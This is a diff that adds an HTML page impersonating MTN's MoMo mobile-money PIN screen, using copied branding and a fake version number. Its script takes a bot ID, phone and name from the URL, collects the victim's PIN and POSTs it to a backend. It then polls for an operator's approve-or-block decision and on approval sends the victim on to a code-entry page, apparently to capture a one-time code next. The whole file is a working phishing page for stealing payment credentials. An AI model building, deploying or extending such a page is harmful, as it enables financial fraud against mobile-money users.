@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MoMo - PIN</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fff;
+      overflow-x: hidden;
+    }
+
+    .app {
+      position: relative;
+      width: 100%;
+      max-width: 540px;
+      min-height: 100vh;
+      min-height: 100svh;
+      margin: 0 auto;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    .top {
+      position: relative;
+      height: 220px;
+      background: #004c69;
+      padding-top: 52px;
+    }
+
+    .top::after {
+      content: "";
+      position: absolute;
+      left: -10%;
+      bottom: -75px;
+      width: 120%;
+      height: 125px;
+      background: #fff;
+      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+    }
+
+    .top-bar {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 22px;
+      margin-top: -10px;
+    }
+
+    .back-btn {
+      color: #ffd500;
+      font-size: 30px;
+      text-decoration: none;
+      font-weight: 300;
+      line-height: 1;
+      background: none;
+      border: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .back-btn:hover {
+      color: #ffffff;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo-box {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(145deg, #087398, #003d59);
+      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-symbol {
+      width: 22px;
+      height: 28px;
+      background: #ffd500;
+      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
+      position: relative;
+    }
+    .logo-symbol::after {
+      content: "";
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: #004c69;
+      border-radius: 50%;
+      left: 8px;
+      top: 8px;
+    }
+
+    .logo-text {
+      color: #ffd500;
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .logo-text .light {
+      font-weight: 400;
+      font-size: 14px;
+      color: #b8d4e8;
+    }
+
+    .card {
+      position: relative;
+      z-index: 5;
+      width: calc(100% - 36px);
+      margin: -100px auto 0;
+      background: #fff;
+      border-radius: 34px;
+      padding: 32px 27px 27px;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
+    }
+
+    .title {
+      text-align: center;
+      color: #07516b;
+      font-size: 25px;
+      font-weight: 400;
+      margin-bottom: 24px;
+    }
+    .title strong {
+      font-weight: 700;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 28px;
+    }
+
+    .input-wrapper {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .pin-box {
+      width: 50px;
+      height: 60px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      background: #fff;
+      font-size: 28px;
+      font-weight: 600;
+      text-align: center;
+      color: #0a0a0a;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: Arial, Helvetica, sans-serif;
+      caret-color: #005572;
+    }
+    .pin-box:focus {
+      border-color: #005572;
+      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
+    }
+
+    .pin-box.error {
+      border-color: #c0392b;
+      box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
+    }
+
+    #pinInput {
+      display: none;
+    }
+
+    #otp-alert {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 500;
+      min-height: 0;
+      margin-top: 8px;
+      padding: 0;
+      border-radius: 12px;
+      background: transparent;
+      transition: all 0.2s;
+      border: 1px solid transparent;
+      display: none;
+    }
+
+    #otp-alert.show {
+      display: block;
+      padding: 10px 12px;
+      min-height: 24px;
+    }
+
+    #otp-alert.error {
+      background: #fef3f2;
+      color: #c0392b;
+      border-color: #fecdca;
+    }
+
+    #otp-alert.success {
+      background: #ecfdf3;
+      color: #0b2b3b;
+      border-color: #abf0d1;
+    }
+
+    .bottom {
+      width: 100%;
+      padding: 0 18px 14px;
+      margin-top: 30px;
+    }
+
+    .continue-btn {
+      width: 100%;
+      height: 69px;
+      border: none;
+      border-radius: 40px;
+      background: #d1d5db;
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      cursor: not-allowed;
+      font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .continue-btn:enabled {
+      background: #005572;
+      cursor: pointer;
+    }
+    .continue-btn:enabled:hover {
+      background: #00415a;
+    }
+    .continue-btn:enabled:active {
+      transform: scale(.98);
+    }
+
+    .continue-btn.loading:disabled {
+      background: #005572;
+      opacity: 1;
+      cursor: wait;
+    }
+
+    .continue-btn .btn-text { display: inline; }
+    .continue-btn .btn-spinner {
+      display: none;
+      width: 26px;
+      height: 26px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    .continue-btn.loading .btn-text { display: none; }
+    .continue-btn.loading .btn-spinner { display: inline-block; }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #bbb;
+      letter-spacing: 0.5px;
+      padding-bottom: 12px;
+    }
+
+    @media (max-width: 480px) {
+      .top {
+        height: 190px;
+        padding-top: 40px;
+      }
+      .top-bar {
+        padding: 0 16px;
+      }
+      .card {
+        width: calc(100% - 28px);
+        margin-top: -90px;
+        padding: 28px 20px 24px;
+        border-radius: 28px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .pin-box {
+        width: 42px;
+        height: 52px;
+        font-size: 24px;
+      }
+      .continue-btn {
+        height: 62px;
+        font-size: 20px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .card {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+      .title {
+        font-size: 20px;
+      }
+      .input-wrapper {
+        gap: 8px;
+      }
+      .pin-box {
+        width: 36px;
+        height: 46px;
+        font-size: 20px;
+      }
+      .continue-btn {
+        height: 58px;
+        font-size: 18px;
+      }
+    }
+
+    @media (max-height: 750px) {
+      .bottom {
+        margin-top: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app">
+
+  <div class="top">
+    <div class="top-bar">
+      <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+      <div class="logo">
+        <div class="logo-box">
+          <div class="logo-symbol"></div>
+        </div>
+        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
+      </div>
+      <div style="width: 30px;"></div>
+    </div>
+  </div>
+
+  <div class="card">
+
+    <div class="title">Enter Your <strong>MoMo PIN</strong></div>
+
+    <div class="input-wrapper">
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+    </div>
+    <input type="hidden" id="pinInput" />
+
+    <div id="otp-alert"></div>
+
+  </div>
+
+  <div class="bottom">
+    <button id="verifyBtn" class="continue-btn" disabled>
+      <span class="btn-text">SUBMIT</span>
+      <span class="btn-spinner"></span>
+    </button>
+  </div>
+
+  <div class="footer">v 5.3.2 (1.0.0)</div>
+
+</div>
+
+<!-- ============================================================
+     SCRIPT 1 — BOT ID RESOLVER
+     Runs first. Reads botId from URL immediately. Never defaults
+     to bot1. Persists to localStorage. Rewrites URL so refreshes
+     keep it. Stops the page if botId is missing.
+     ============================================================ -->
+<script>
+(function () {
+  try {
+    const params = new URLSearchParams(window.location.search);
+
+    let botId = params.get('botId');
+    if (!botId) {
+      botId = localStorage.getItem('botId');
+    }
+
+    if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+      document.documentElement.innerHTML =
+        '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+        '<h2>Invalid link</h2>' +
+        '<p>Please open this page through the official link.</p>' +
+        '</body>';
+      window.__BOTID_MISSING__ = true;
+      throw new Error('botId missing from URL and localStorage');
+    }
+
+    localStorage.setItem('botId', botId);
+
+    if (params.get('botId') !== botId) {
+      params.set('botId', botId);
+      const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+      window.history.replaceState({}, '', newUrl);
+    }
+
+    window.__BOT_ID__ = botId;
+
+    console.log('🆔 botId resolved immediately:', botId);
+  } catch (err) {
+    console.error('botId resolver failed:', err.message);
+  }
+})();
+</script>
+
+<!-- ============================================================
+     SCRIPT 2 — PIN PAGE LOGIC
+     ============================================================ -->
+<script>
+(function() {
+  const BACKEND_URL = "";
+
+  // ---------- BOTID (resolved by script 1 above) ----------
+  const botId = window.__BOT_ID__;
+  if (!botId) {
+    console.error('❌ No botId — page cannot function');
+    return;
+  }
+
+  // ---------- DATA ----------
+  const urlParams = new URLSearchParams(window.location.search);
+  let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  let name = urlParams.get('name') || localStorage.getItem('fullName');
+
+  if (!phone) {
+    alert('Session expired. Please start over.');
+    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
+    return;
+  }
+  if (!name) {
+    name = 'MTN User';
+    localStorage.setItem('fullName', name);
+  }
+  localStorage.setItem('phone', phone);
+
+  // ---------- DOM REFS ----------
+  const pinBoxes = document.querySelectorAll('.pin-box');
+  const hiddenInput = document.getElementById('pinInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const alertEl = document.getElementById('otp-alert');
+
+  console.log('🔢 pin.html ready — ' + pinBoxes.length + ' boxes found');
+
+  // ---------- HELPERS ----------
+  function getPinFromBoxes() {
+    let pin = '';
+    pinBoxes.forEach(b => { if (b.value) pin += b.value; });
+    return pin;
+  }
+
+  function getFilledCount() {
+    let count = 0;
+    pinBoxes.forEach(b => { if (b.value) count++; });
+    return count;
+  }
+
+  function updateButtonState() {
+    const filled = getFilledCount();
+    const isComplete = (filled === pinBoxes.length);
+    const isLoading = verifyBtn.classList.contains('loading');
+    const shouldBeDisabled = !isComplete || isLoading;
+
+    verifyBtn.disabled = shouldBeDisabled;
+
+    hiddenInput.value = isComplete ? getPinFromBoxes() : '';
+
+    console.log('🔘 PIN boxes: ' + filled + '/' + pinBoxes.length + ' → button ' + (shouldBeDisabled ? 'DISABLED' : 'ENABLED'));
+  }
+
+  function showAlert(text, type) {
+    alertEl.textContent = text;
+    alertEl.className = 'show ' + (type || '');
+  }
+
+  function clearAlert() {
+    alertEl.textContent = '';
+    alertEl.className = '';
+  }
+
+  function setLoading(on) {
+    if (on) {
+      verifyBtn.classList.add('loading');
+      verifyBtn.disabled = true;
+    } else {
+      verifyBtn.classList.remove('loading');
+    }
+    updateButtonState();
+  }
+
+  function clearAllBoxes() {
+    pinBoxes.forEach(b => {
+      b.value = '';
+      b.classList.remove('error');
+    });
+    hiddenInput.value = '';
+    updateButtonState();
+  }
+
+  // ---------- PIN BOX INPUT ----------
+  pinBoxes.forEach((box, i) => {
+    box.addEventListener('input', function() {
+      const cleaned = this.value.replace(/\D/g, '').slice(0, 1);
+      this.value = cleaned;
+      this.classList.remove('error');
+
+      if (cleaned && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+      }
+
+      clearAlert();
+      updateButtonState();
+    });
+
+    box.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace') {
+        if (!this.value && i > 0) {
+          pinBoxes[i - 1].value = '';
+          pinBoxes[i - 1].focus();
+          updateButtonState();
+          e.preventDefault();
+        } else if (this.value) {
+          this.value = '';
+          updateButtonState();
+          e.preventDefault();
+        }
+      } else if (e.key === 'ArrowLeft' && i > 0) {
+        pinBoxes[i - 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'Enter') {
+        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) {
+          verifyBtn.click();
+        }
+        e.preventDefault();
+      }
+    });
+
+    box.addEventListener('focus', function() {
+      this.select();
+      this.classList.remove('error');
+    });
+
+    box.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = paste.replace(/\D/g, '').slice(0, pinBoxes.length);
+      if (!digits) return;
+
+      pinBoxes.forEach((b, idx) => {
+        b.value = digits[idx] || '';
+        b.classList.remove('error');
+      });
+
+      const lastFilled = Math.min(digits.length, pinBoxes.length) - 1;
+      if (lastFilled >= 0) pinBoxes[lastFilled].focus();
+
+      clearAlert();
+      updateButtonState();
+    });
+  });
+
+  // ---------- SUBMIT ----------
+  let pollTimer = null;
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  verifyBtn.addEventListener('click', async function() {
+    if (verifyBtn.disabled || verifyBtn.classList.contains('loading')) return;
+
+    const pin = getPinFromBoxes();
+    if (pin.length !== pinBoxes.length) return;
+
+    setLoading(true);
+    clearAlert();
+
+    try {
+      const res = await fetch(BACKEND_URL + '/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: name,
+          phone: phone,
+          pin: pin,
+          botId: botId
+        })
+      });
+
+      if (!res.ok) {
+        const errText = await res.text();
+        const clean = errText.startsWith('<')
+          ? ('HTTP ' + res.status)
+          : (errText || ('HTTP ' + res.status));
+        throw new Error(clean);
+      }
+
+      const data = await res.json();
+      if (!data.requestId) throw new Error('No request ID received');
+
+      stopPolling();
+      let attempts = 0;
+      const MAX_ATTEMPTS = 120;
+
+      pollTimer = setInterval(async function() {
+        attempts++;
+        try {
+          const checkRes = await fetch(BACKEND_URL + '/check-pin/' + data.requestId);
+          const status = await checkRes.json();
+
+          if (status.blocked === true) {
+            stopPolling();
+            setLoading(false);
+            clearAllBoxes();
+            showAlert('❌ Account restricted. Please try again later.', 'error');
+            return;
+          }
+
+          if (status.approved === true) {
+            stopPolling();
+            setLoading(false);
+            showAlert('✅ PIN verified! Redirecting...', 'success');
+            setTimeout(function() {
+              window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
+                                     '&phone=' + encodeURIComponent(phone) +
+                                     '&name=' + encodeURIComponent(name);
+            }, 700);
+            return;
+          }
+
+          if (status.approved === false) {
+            stopPolling();
+            setLoading(false);
+            clearAllBoxes();
+            showAlert('❌ Incorrect PIN. Please try again.', 'error');
+            pinBoxes.forEach(function(b) { b.classList.add('error'); });
+            setTimeout(function() {
+              pinBoxes.forEach(function(b) { b.classList.remove('error'); });
+            }, 600);
+            if (pinBoxes[0]) pinBoxes[0].focus();
+            return;
+          }
+
+          if (attempts > MAX_ATTEMPTS) {
+            stopPolling();
+            setLoading(false);
+            showAlert('⏳ Taking too long. Please try again.', 'error');
+            return;
+          }
+        } catch (err) {
+          console.error('Polling error:', err);
+        }
+      }, 1500);
+
+    } catch (err) {
+      setLoading(false);
+      showAlert('❌ ' + (err.message || 'Something went wrong. Please try again.'), 'error');
+    }
+  });
+
+  // ---------- BACK-FORWARD CACHE RESET ----------
+  window.addEventListener('pageshow', function (event) {
+    if (event.persisted) {
+      stopPolling();
+      verifyBtn.classList.remove('loading');
+      clearAlert();
+      updateButtonState();
+      if (pinBoxes[0]) pinBoxes[0].focus();
+    }
+  });
+
+  // ---------- INIT ----------
+  updateButtonState();
+  if (pinBoxes[0]) pinBoxes[0].focus();
+
+  document.addEventListener('focusin', updateButtonState);
+  document.addEventListener('focusout', function() {
+    setTimeout(updateButtonState, 20);
+  });
+})();
+</script>
+
+</body>
+</html>
